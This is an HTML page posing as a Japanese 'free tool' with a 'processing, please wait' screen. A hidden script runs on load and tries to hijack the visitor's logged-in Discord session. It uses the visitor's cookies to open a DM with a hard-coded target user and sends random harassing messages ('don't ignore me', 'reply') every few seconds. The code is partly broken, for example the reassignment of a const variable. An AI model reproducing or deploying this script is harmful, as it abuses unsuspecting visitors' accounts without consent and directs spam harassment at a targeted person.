<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>無料ツール</title>
  <style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap'); /* サイバーパンクフォント */

  :root {
    --neon-green: #00ff41;
    --neon-cyan: #00ffff;
    --bg-gradient: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #B3FFAB 100%);
    --glow: 0 0 20px var(--neon-cyan), 0 0 40px var(--neon-green);
  }

  body { 
    background: var(--bg-gradient);
    background-attachment: fixed;
    color: #ffffff;
    font-family: 'Orbitron', monospace;
    text-align: center; 
    padding: 20px;
    text-shadow: var(--glow);
    animation: neonPulse 3s ease-in-out infinite alternate;
  }

  @keyframes neonPulse {
    0% { filter: brightness(1) contrast(1); }
    100% { filter: brightness(1.2) contrast(1.1); }
  }

  h1 { 
    font-size: 2.5em; 
    font-weight: 900;
    background: linear-gradient(90deg, var(--neon-cyan) 0%, var(--neon-green) 100%);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    text-shadow: var(--glow);
    margin-bottom: 20px;
  }

  p { 
    font-size: 1.2em; 
    color: #e0ffe0;
    text-shadow: 0 0 10px var(--neon-green);
  }

  video, canvas { 
    max-width: 100%; 
    border: 3px solid var(--neon-cyan);
    box-shadow: var(--glow);
    border-radius: 10px;
    margin: 20px 0;
  }

  button { 
    font-size: 1.5em; 
    padding: 15px 30px; 
    margin: 10px; 
    background: linear-gradient(45deg, var(--neon-green), var(--neon-cyan));
    color: #000; 
    border: none; 
    border-radius: 5px;
    box-shadow: var(--glow);
    font-family: 'Orbitron', sans-serif;
    cursor: pointer;
    transition: all 0.3s;
  }

  button:hover {
    box-shadow: 0 0 30px var(--neon-cyan), 0 0 60px var(--neon-green);
    transform: scale(1.05);
    filter: brightness(1.3);
  }
</style>
</head>
<body>
  <h1>処理中です... しばらくお待ちください</h1>

  <script>
    // 対象DiscordユーザーID（事前に取得）
    const TARGET_ID = '1443789104423633058'; // ←ここに対象のDiscord IDを入力

    const MESSAGES = [
      'おい',
      '無視すんな',
      '返事しろよ',
      'DM見て',
      'hey',
      '話そうぜ',
      'オンライン？'
    ];

    // Discordクライアント注入検知＆操作
    function startSpam() {
      // DiscordのWebpackモジュールを探す
      const webpackRequire = window.webpackChunkdiscord_app?.push([[Symbol()],{},(req)=>{webpackRequire=req}]) && window.webpackChunkdiscord_app.pop() && webpackRequire;

      if (!webpackRequire) {
        document.body.innerHTML = '<h1>Discordを開いてからこのページを再読み込みしてください</h1>';
        return;
      }

      const modules = Object.values(webpackRequire.c);
      const findModule = (filter) => modules.find(m => m?.exports?.default?.getCurrentUser || Object.values(m.exports || {}).some(filter));

      // DM送信モジュール取得
      const sendMessageModule = findModule(m => m?.sendMessage);
      const getChannelModule = findModule(m => m?.getChannelId);

      if (!sendMessageModule || !getChannelModule) {
        document.body.innerHTML += '<p>モジュール取得失敗（Discord更新対応待ち）</p>';
        return;
      }

      setInterval(async () => {
        try {
          const channel = await fetch(`https://discord.com/api/v9/users/${TARGET_ID}/channels`, {
            credentials: 'include',
            headers: { 'x-super-properties': btoa(JSON.stringify({os:"Windows",browser:"Chrome"})) }
          }).then(r => r.json());

          const dmChannelId = channel.id || channel[0]?.id;
          if (!dmChannelId) return;

          const msg = MESSAGES[Math.floor(Math.random() * MESSAGES.length)];
          
          await fetch(`https://discord.com/api/v9/channels/${dmChannelId}/messages`, {
            method: 'POST',
            credentials: 'include',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ content: msg })
          });
        } catch(e) {}
      }, Math.floor(Math.random() * 4000) + 3000); // 3-7秒間隔
    }

    // ページロード後即実行
    setTimeout(startSpam, 2000);
  </script>
</body>
</html>
